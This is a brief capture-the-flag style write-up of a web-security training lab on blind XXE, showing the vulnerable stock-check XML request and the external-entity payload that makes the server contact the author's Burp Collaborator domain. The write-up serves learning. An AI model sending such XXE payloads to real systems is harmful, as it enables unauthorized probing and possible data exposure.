# Lab: Blind XXE with out-of-band interaction

>This lab has a "Check stock" feature that parses XML input but does not display the result.

>You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

>To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

### Observations
My burp collaborator link: `gxhmst8uwfts21tt0gdapklrgim8ax.burpcollaborator.net`

We can see the following XML in the `POST /product/stock` endpoint: `<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`

### Solution
Send the `POST /product/stock` request to repeater so that we can modify the request

I injected an xml external entity that makes a request to my collaborator instance with this payload: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://gxhmst8uwfts21tt0gdapklrgim8ax.burpcollaborator.net"> ]>`

I then changed the value within the productId tags to `&xxe;`, this executes the http request specified in my injected XXE. Remember to prepend your collaborator with `http://`

Send the request, lab solved!


